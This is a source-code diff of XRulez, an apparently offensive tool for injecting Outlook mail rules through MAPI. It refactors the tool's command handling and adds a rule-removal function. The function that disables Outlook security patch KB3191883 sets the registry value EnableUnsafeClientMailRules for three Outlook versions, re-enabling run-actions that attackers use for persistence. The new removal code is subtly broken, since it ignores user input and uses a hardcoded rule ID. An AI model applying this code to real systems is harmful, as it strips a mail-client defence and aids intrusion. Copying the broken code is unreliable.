@@ -63,13 +63,11 @@ bool XRulez::Application::ProcessInputParameters()
 	{
 		DllProcessStringTableParameters();
 		PerformInjection();
-		return true;
 	}
 	else
-	{
-		// Process executable's input.
-		return ExeProcessParameters();
-	}
+		ExeProcessParameters();
+	
+	return true;
 }
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -123,49 +121,53 @@ void XRulez::Application::ProcessPreprocessorParameters()
 }
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-bool XRulez::Application::ExeProcessParameters()
+void XRulez::Application::ExeProcessParameters()
 {
 	// This function should not be called in DLL builds.
 	CHECK(!Enviro::IsDllBuild);
 	if (Enviro::IsDllBuild)
-		return false;
+		return;
 
 	// Access command line params.
 	auto& commandLineArgs = Enviro::AccessCommandLineParams();
 
 	// Sanity validation.
 	if (commandLineArgs.size() < 2 || commandLineArgs[1].size() != 2 || commandLineArgs[1][0] != TEXT('-'))
-		return ExeShowUsage(true), false;
+		return ExeShowUsage(true);
 
 	// Handle commands separately.
 	switch (commandLineArgs[1][1])
 	{
 	case TEXT('l'):																//< Display a list of available MAPI profiles.
-		return ExeListOutlookProfiles(), false;
+		return ExeListOutlookProfiles();
 
 	case TEXT('r'):																//< Disable security patch KB3191883.
 		return ExeDisableSecurityPatchKB3191883();
 
 	case TEXT('a'):																//< Process command line values, validate them and proceed to message injection.
-		return ExeProcessCommandLineValues() && PerformInjection();
+		ExeProcessCommandLineValues() && PerformInjection();
+		return;
 
 	case TEXT('d'):																//< Display parameters default (precompiled) values.
-		return ExeShowDefaultParamsValues(), false;
+		return ExeShowDefaultParamsValues();
 
 	//case TEXT('i'):															//< Perform interactive configuration and proceed to message injection.
 		//return ExePerformInteractiveConfiguration(), true;
 
 	case TEXT('e'):																//< Shows all existing rules.
-		return ExeDisplayAllRules(), true;
+		return ExeDisplayAllRules();
+
+	//case TEXT('x'):																//< Shows all existing rules.
+		//return ExeRemoveRule();
 
 	case TEXT('h'):																//< Display help.
-		return ExeShowUsage(false), false;
+		return ExeShowUsage(false);
 
 	case TEXT('o'):																//< Check if Outlook is running at the moment.
-		return ExeCheckIfOutlookIsRunning(), false;
+		return ExeCheckIfOutlookIsRunning();
 
 	default:																	//< Wrong input.
-		return ExeShowUsage(true), false;
+		return ExeShowUsage(true);
 	}
 }
 
@@ -389,6 +391,47 @@ void XRulez::Application::ExeDisplayAllRules()
 }
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+void XRulez::Application::ExeRemoveRule()
+{
+	Comment(TEXT("Parsing rule ID..."));
+
+	// Sanity check.
+	if (Enviro::AccessCommandLineParams().size() < 3)
+		return CommentError(TEXT("[-] Error - rule ID not provided after '-x' switch. Try something like:\nXRulez.exe -x 1234567890ABCDEF"));
+	if (Enviro::AccessCommandLineParams()[2].size() < 1 OR Enviro::AccessCommandLineParams()[2].size() > 16)
+		return CommentError(TEXT("[-] Error - rule ID should provided as a hex 64-bit value, e.g.:\nXRulez.exe -x 1234567890ABCDEF"));
+
+	// Parse Rule ID.
+	LARGE_INTEGER ruleId;
+	ruleId.QuadPart = 0x1000001ADAD7CE1;// _wcstoui64(Enviro::AccessCommandLineParams()[2].c_str(), nullptr, 16);
+	Comment(TEXT("Trying to remove rule ") + std::to_tstring((std::uint64_t)ruleId.QuadPart) + TEXT("..."));
+
+	try
+	{
+		// Initialize MapiTools Module.
+		auto xeInitializeMapi = MapiTools::InitializeMapi(m_IsRunningInMultithreadedProcess, m_IsRunningInWindowsService);
+		if (xeInitializeMapi.IsFailure())
+			return ReportError(TEXT("MapiTools::InitializeMapi"), xeInitializeMapi);
+		SCOPE_GUARD{ MapiTools::UninitializeMapi(); };
+
+		// Login to a shared session, then open default message store, then inbox folder, and then enlist all existing rules.
+		if (MapiTools::MapiSession{ MAPI_EXTENDED | MAPI_ALLOW_OTHERS | MAPI_NEW_SESSION | MAPI_USE_DEFAULT | (m_IsRunningInWindowsService ? MAPI_NT_SERVICE : 0), m_ProfileName }
+			.OpenDefaultMessageStore().OpenDefaultReceiveFolder().OpenRulesTable().DeleteRule(ruleId))
+			Comment(TEXT("Done."));
+		else
+			CommentError(TEXT("Error: specified rule ID not found."));
+	}
+	catch (CppTools::XException& e)
+	{
+		CommentError(TEXT("Error. ") + CppTools::StringConversions::Mbcs2Tstring(e.what()) + TEXT("\n") + e.ComposeFullMessage());
+	}
+	catch (std::exception& e)
+	{
+		CommentError(TEXT("Error. ") + CppTools::StringConversions::Mbcs2Tstring(e.what()));
+	}
+}
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 void XRulez::Application::ExeListOutlookProfiles()
 {
 	// This function should not be called in DLL builds.
@@ -501,24 +544,22 @@ bool XRulez::Application::PerformInjection()
 }
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-bool XRulez::Application::ExeDisableSecurityPatchKB3191883()
+void XRulez::Application::ExeDisableSecurityPatchKB3191883()
 {
+	// Helper lambda to set one particular entry in the registry.
 	auto DisablePathForOutlookVersion = [](std::wstring const& registyKey, std::tstring const& outlookVersionName)
 	{
 		if (auto hr = WinTools::Registry::SetValue(WinTools::Registry::HKey::CurrentUser, registyKey, L"EnableUnsafeClientMailRules", 1))
-			return Enviro::tcerr << TEXT("[-] Couldn't re-enable run-actions for ") << CppTools::StringConversions::Convert<std::tstring>(outlookVersionName.c_str()) << TEXT(". ")
+			Enviro::tcerr << TEXT("[-] Couldn't re-enable run-actions for ") << CppTools::StringConversions::Convert<std::tstring>(outlookVersionName.c_str()) << TEXT(". ")
 				<< WinTools::ConvertHresultToMessageWithHresult(hr).c_str() << std::endl << std::endl, false;
-		
-		return true;
 	};
 
+	// Disable all patches.
 	Comment(TEXT("Disabling security patch for Outlook 2010, 2013 and 2016..."));
-	auto success = DisablePathForOutlookVersion(LR"(Software\Microsoft\Office\14.0\Outlook\Security)", TEXT("Outlook 2010"))
-		&& DisablePathForOutlookVersion(LR"(Software\Microsoft\Office\15.0\Outlook\Security)", TEXT("Outlook 2013"))
-		&& DisablePathForOutlookVersion(LR"(Software\Microsoft\Office\16.0\Outlook\Security)", TEXT("Outlook 2016"));
-
+	DisablePathForOutlookVersion(LR"(Software\Microsoft\Office\14.0\Outlook\Security)", TEXT("Outlook 2010"));
+	DisablePathForOutlookVersion(LR"(Software\Microsoft\Office\15.0\Outlook\Security)", TEXT("Outlook 2013"));
+	DisablePathForOutlookVersion(LR"(Software\Microsoft\Office\16.0\Outlook\Security)", TEXT("Outlook 2016"));
 	Comment(TEXT("Done.\n"));
-	return success;
 }
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
